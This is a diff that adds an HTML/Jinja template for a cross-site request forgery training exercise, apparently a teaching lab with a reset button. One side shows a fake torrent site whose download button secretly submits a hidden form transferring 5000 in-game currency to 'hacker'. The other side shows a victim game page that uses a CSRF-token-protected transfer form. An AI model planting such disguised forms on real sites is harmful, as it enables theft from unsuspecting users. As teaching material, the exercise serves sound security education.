@@ -1,0 +1,118 @@
+<html>
+<style>
+   table {
+      font-family: arial, sans-serif;
+      border-collapse: collapse;
+      width: 50%;
+   }
+
+   td,
+   th {
+      border: 1px solid #dddddd;
+      text-align: left;
+      padding: 8px;
+   }
+
+   tr:nth-child(even) {
+      background-color: #dddddd;
+   }
+
+   .vl {
+      border-left: 6px solid black;
+      height: 500px;
+   }
+   address_bar {
+      border: 2px solid black;
+      margin: auto;  
+      padding: 2px;
+      text-align: left;
+   }
+</style>
+
+
+<body>
+
+   <div class="container" style="display: flex; height: 100px;">
+      <div style="width: 40%">
+         <address_bar style="outline: red solid 5px;">https://www.download-games.net/CyberFunk2077</address_bar>
+         <h1>via malicious website</h1>
+         <h2>Totally legal and safe game torrent 😉</h2>
+      
+      
+         <script>
+            function transferCurrency() {
+               alert('your download will begin in few seconds automatically!');
+            }
+         </script>
+      
+         <form action="/transfer" method="post" onsubmit="transferCurrency()">
+            <input type="hidden"
+                name="amount"
+                value="5000"/>
+            <input type="hidden"
+                name="to_player_id"
+                value="hacker"/>
+            <input type="submit"
+                value="dowload torrent for CyberFunk 2077!"/>
+          </form>
+      </div>
+   
+      <div class="vl"></div>
+
+      <div style="width: 40%">
+         <address_bar style="outline: greenyellow solid 5px;">https://www.call-of-dooooty.com/online</address_bar>
+         <h1>An popular online game on different tab of same browser</h1>
+         <table>
+            {% if user and players|length %}
+            <h1>logged in as: {{ user.name }} </h1>
+            <h1>your balance: {{ user.balance }} </h1>
+            <tr>
+               <th>Player Name</th>
+               <th>In Game Currency Balance</th>
+            </tr>
+            {% for player in players %}
+            <tr>
+               <td>
+                  {{ player.name }}
+               </td>
+               <td>
+                  {{ player.balance }}
+               </td>
+            </tr>
+            {% endfor %}
+            {% elif players and 'error' in players %}
+            <h2>players Error: {{ players['error'] }}</h2>
+            {% else %}
+            <div>
+               <button id = 'btnAdd'>login via SSO</button>
+               <script src = '/js'></script>
+            </div>
+            {% endif %}
+         </table>
+
+         {% if csrf_token %}
+            <h1>transfer from your account:</h1>
+            <form action="/transfer" method="post">
+               <input type="hidden" name="req_csrf_token" value="{{ csrf_token }}" />
+               <input type="input" name="amount" placeholder="amount"/>
+               <input type="input" name="to_player_id" placeholder="receiver (vineet etc)"/>
+               <input type="submit" value="transfer currency to"/>
+            </form>
+          {% endif %}
+      </div>
+      <!-- <hr class="solid"> -->
+      <div class="vl"></div>
+
+      <div style="width: 20%">
+         <a href="reset/">
+            <button>RESET EXERCISE</button>
+         </a>
+         <h3>Debug Information:</h3>
+         {% if error %}
+         <h2>{{ error }}</h2>
+         {% endif %}
+      </div>
+   </div>
+</body>
+
+</html>
